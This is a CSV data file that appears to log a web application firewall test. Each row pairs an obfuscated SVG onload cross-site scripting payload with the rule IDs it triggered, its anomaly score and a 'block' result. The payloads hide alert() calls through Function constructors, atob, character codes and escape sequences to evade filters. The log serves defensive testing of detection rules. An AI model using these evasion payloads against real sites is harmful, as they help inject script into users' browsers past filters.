2928,"<svg onload='(new Function(""ret""+""urn al""+""ert""))()(1)'>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,41v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || o14,13v217,56 || o14,13v217,56t:urlDecodeUni || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603627442.694592
2929,"<svg onload='(Function[""constructor""](""ale""+""rt(1)""))()'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,42v217,57t:urlDecode,t:replaceComments,t:compressWhitespace || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603627561.300039
2931,"<svg onload='(new Function(""retu\u0072n aler\u0074""))()(1)'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,60 || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603627797.797556
2933,"<svg onload='(new Function(String.fromCharCode(114,101,116,117,114,110,32,97,108,101,114,116)))()(1)'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603628076.292287
2936,"<svg onload='(new Function(""\u0072\u0065\u0074\u0075\u0072\u006e al""+""ert""))()(1)'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,83 || o14,13v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603628369.910929
2940,"<svg onload='(new Function(""re""+""tur""+""n\u0020ale""+""rt""))()(1)'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,64 || o14,13v217,64t:urlDecodeUni || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603628942.097884
2944,"<svg onload='(new Function(""r""+""e""+""t""+""u""+""r""+""n al""+""ert""))()(1)'>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,53v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || o14,13v217,68 || o14,13v217,68t:urlDecodeUni || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603629514.315105
2946,"<svg onload='(new Function(""\162\145\164\165\162\156\040\141\154\145\162\164""))()(1)'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603629884.648744
2948,"<svg onload='(new Function(""return \\u0061ler\\u0074""))()(/XSS/)'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603630039.159139
2949,"<svg onload='(Function[""constru""+""ctor""](""return \\u0061ler\\u0074""))()(/XSS/)'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,65v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603630284.423983
2954,"<svg onload='(new Function(""return al""+""ert""))()(/XSS/)'>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,42v217,57t:urlDecode,t:replaceComments,t:compressWhitespace || o14,13v217,57 || o14,13v217,57t:urlDecodeUni || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603630829.179401
2955,<svg onload='(new Function(`return \\u0061ler\\u0074`))()(/XSS/)'>,0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603630941.825654
2956,"<svg onload='(new Function(""return \u0061ler\u0074""))()(/XSS/)'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603631031.212703
2957,"<svg onload='(new Function(atob(""cmV0dXJuIGFsZXJ0"")))()(/XSS/)'>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,49v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || o14,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603631263.055887
2960,"<svg onload='(new Function(""return ""+atob(""YWxlcnQ="")))()(/XSS/)'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,66 || o14,13v217,66t:urlDecodeUni || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603631589.144221
2977,"<svg onload='globalThis.Function(""ale""+""rt(1)"")()'>",0,1,block,4,"941100,941120,941160,949110","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603633614.791474
2979,"<svg onload='(new top.Function(""\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029""))()'>",0,1,block,4,"941100,941120,941160,949110","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603633988.971816
3001,"<svg/onload='Function(atob(""d2luZG93LmFsZXJ0KDEp""))()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603636741.723689
3002,"<svg onload='Function(atob&#40""d2luZG93LmFsZXJ0KDEp""&#41)()'></svg>",0,1,block,5,"941100,941120,941160,942100,949110","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,67 || ",20,177603636868.620547
3003,"<svg onload='Function(atob&#x28;""d2luZG93LmFsZXJ0KDEp""&#x29;)()'></svg>",0,1,block,5,"941100,941120,941160,942100,949110","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,71 || ",20,17760363703.802777
3005,<svg onload='Function(atob&#40;&#34;d2luZG93LmFsZXJ0KDEp&#34;&#41;)()'></svg>,0,1,block,5,"941100,941120,941160,942100,949110","v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,77 || ",20,177603637258.496537
3007,"<svg onload='new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()' />",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603637479.173884
3010,"<svg onload='new(Function)(""\u0061\u006c\u0065\u0072\u0074(1)"")()' />",0,1,block,5,"933210,941100,941120,941160,949110","o16,49v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603637823.780012
3011,<svg onload='new Function(`\u0061\u006c\u0065\u0072\u0074(1)`)()' />,0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,68 || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603638098.076488
3012,"<svg onload='new Function(atob(""YWxlcnQoMSk""))()' />",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,52 || v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603638140.725093
3014,"<svg onload='new Function([""\u0061"",""\u006c"",""\u0065"",""\u0072"",""\u0074"",""\u0028"",""\u0031"",""\u0029""].join(""""))()' />",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,115 || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603638323.158838
3016,"<svg onload='new Function(""\141\154\145\162\164\50\61\51"")()' />",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603638622.358472
3018,"<svg onload='new Function(""\u0061""+""lert""+""(1)"")()' />",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,54 || o13,13v217,54t:urlDecodeUni || v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603638811.384055
3020,"<svg onload='new(Function.constructor)(""\u0061\u006c\u0065\u0072\u0074(1)"")()' />",0,1,block,5,"933210,941100,941120,941160,949110","o16,61v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603639195.133747
3026,"<svg onload='new Function(""\u0061\u006c""+""\u0065\u0072""+""\u0074(1)"")()' />",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,74 || o13,13v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603639854.307705
3027,"<svg onload='new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603639951.361746
3028,"<svg onload='new Function(atob(""YWxlcnQoMSk""))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,50 || v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603640087.693511
3030,"<svg onload='new Function(""al""+""ert""+""(1)"")()'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v216,47 || o13,13v216,47t:urlDecodeUni || v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603640394.547325
3031,"<svg onload='new Function([""\u0061"",""\u006c"",""\u0065"",""\u0072"",""\u0074"",""(1)""].join(""""))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603640419.288587
3032,"<svg onload='new Function(""\141\154\145\162\164\05061\051"")()'>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760364052.255714
3035,"<svg onload='new(Function)(""\u0061\u006c\u0065\u0072\u0074(1)"")()'>",0,1,block,5,"933210,941100,941120,941160,949110","o16,49v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760364096.891596
3037,"<svg onload='new Function(""\u0061\u006c""+""ert(1)"")()'>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v216,54 || o13,13v216,54t:urlDecodeUni || v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603641232.049620
3038,"<svg onload='new Function([""ale"",""rt("",1,"")""].join(String()))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,65 || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603641320.771013
3046,"<svg onload='new Function(""\u{61}\u{6c}\u{65}\u{72}\u{74}\u{28}1\u{29}"")()'>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603642388.444147
3048,"<svg onload='(function(){return eval})()(""\u0061\u006c\u0065\u0072\u0074(17)"")'>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,65v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603642512.993205
3055,"<svg onload='parent[""Function""](""\141\154\145\162\164(17)"")()'>",0,1,block,5,"933210,941100,941120,941160,949110","o19,42v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603643429.739018
3060,"<svg onload='Function[""prototype""][""constructor""](""\u0061\u006c\u0065\u0072\u0074(17)"")()'>",0,1,block,5,"933210,941100,941120,941160,949110","o21,68v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603644044.540198
3065,"<svg onload='Function(atob(""YWxlcnQoMTcp""))()'>",0,1,block,4,"941100,941120,941160,949110","v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603644752.181950
3066,"<svg onload='Function(String.fromCharCode(97,108,101,114,116,40,49,55,41))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o22,19v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603644825.859104
3072,"<svg onload='self[""Function""](""\u0061\u006c\u0065\u0072\u0074(3)"")()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,51v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,70t:urlDecodeUni,t:compressWhitespace || ",25,177603645512.830310
3080,"<svg onload='(function(){eval(""\u0061\u006c\u0065\u0072\u0074(3)"")})()'>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o22,7v217,72 || o25,45v217,72 || o14,11v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603646569.721294
3083,"<svg onload='(new Function(""return this""))()[""Function""](""\u0061\u006c\u0065\u0072\u0074(3)"")()'>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,82v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || o14,13v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603646934.148742
3086,"<svg onload='Reflect.construct(Function,[""\u0061\u006c\u0065\u0072\u0074(3)""])()'>",0,1,block,4,"941100,941120,941160,949110","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603647392.820403
3103,"<svg onload='(new window[""Function""](""al""+""ert(1)""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,41v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o18,18v217,56t:urlDecodeUni,t:compressWhitespace || ",25,177603649421.790614
